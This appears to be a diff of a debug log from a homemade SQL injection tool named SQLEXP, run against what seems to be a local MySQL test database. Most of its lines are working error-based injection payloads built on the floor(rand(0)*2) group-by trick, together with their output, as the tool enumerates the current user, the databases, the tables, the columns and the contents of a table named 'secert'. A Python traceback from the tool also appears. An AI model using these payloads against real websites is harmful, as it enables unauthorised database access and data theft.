@@ -1,3 +1,116 @@
 get current_user
 CurrentUser:root@localhost
 CurrentUser is:root@localhost
+Please input url and inject paramter!!!
+get current_user
+CurrentUser:
+CurrentUser is:
+get current_user
+ and ((select 1 from(select count(*),concat((select ((select concat(1,0x4c36764b73,user(),0x4c36764b73,1) from information_schema.schemata limit 0,1)) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a))
+CurrentUser:
+CurrentUser is:
+get current_user
+ and ((select 1 from(select count(*),concat((select ((select concat(1,0x6e42527a67,user(),0x6e42527a67,1) from information_schema.schemata limit 0,1)) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a))
+CurrentUser:test@localhost
+CurrentUser is:test@localhost
+list tables
+'NoneType' object is not iterable
+Traceback (most recent call last):
+  File "SQLEXP.py", line 58, in main
+    start()
+  File "D:\git_work\SQLEXP\lib\controller\hander.py", line 10, in start
+    action()
+  File "D:\git_work\SQLEXP\lib\controller\action.py", line 137, in action
+    act.get_tables()
+  File "D:\git_work\SQLEXP\lib\controller\action.py", line 68, in get_tables
+    for db in dbs:
+TypeError: 'NoneType' object is not iterable
+
+list all databases
+CountsEnties:2
+all dbs counts is :2
+Ent:information_schema
+Ent:test
++--------------------+
+|     DATABASE:      |
++--------------------+
+| information_schema |
+|        test        |
++--------------------+
+list tables
+CountsEnties:2
+all dbs counts is :2
+Ent:secert
+Ent:user
+test
++---------+
+| TABLES: |
++---------+
+|  secert |
+|   user  |
++---------+
+list columns
+CountsEnties:1
+Ent:secert
++--------+
+| secert |
++--------+
+| secert |
++--------+
+[u'secert']
+[u'secert']
+test.secert
+
+CountsEnties:1
+Ent:test.secert.['secert']:
++--------+
+| secert |
++--------+
+|        |
++--------+
+[u'secert']
+[u'user']
+test.secert
+
+CountsEnties:1
+Ent:test.secert.['user']:
++------+
+| user |
++------+
+|      |
++------+
+list columns
+CountsEnties:1
+Ent:secert
++--------+
+| secert |
++--------+
+| secert |
++--------+
+list columns
+ and ((select 1 from(select count(*),concat((select ((select concat(1,0x3357645956,count(*),0x3357645956,1) from information_schema.columns where table_schema=0x74657374 and table_name=0x736563657274 limit 0,1)) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a))
+CountsEnties:1
+ and ((select 1 from(select count(*),concat((select ((select concat(1,0x54364a5931,column_name,0x54364a5931,1) from information_schema.columns where table_schema=0x74657374 and table_name=0x736563657274 limit 0,1)) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a))
+Ent:secert
++--------+
+| secert |
++--------+
+| secert |
++--------+
+[u'secert']
+ and ((select 1 from(select count(*),concat((select ((select concat(1,0x6653424341,count(*),0x6653424341,1) from information_schema.columns where table_schema=0x74657374 and table_name=0x736563657274 limit 0,1)) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a))
+CountsEnties:1
+ and ((select 1 from(select count(*),concat((select ((select concat(1,0x344c543730,column_name,0x344c543730,1) from information_schema.columns where table_schema=0x74657374 and table_name=0x736563657274 limit 0,1)) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a))
+Ent:secert
+[u'secert']
+test.secert
+
+ and ((select 1 from(select count(*),concat((select ((select concat(1,0x533747594f,count(*),0x533747594f,1) from test.secert limit 0,1)) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a))
+CountsEnties:1
+ and ((select 1 from(select count(*),concat((select ((select concat(1,0x6d31466251,secert,0x6d31466251,1) from test.secert limit 0,1)) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a))
+Ent:test.secert.['secert']:
++--------+
+| secert |
++--------+
+|        |
++--------+
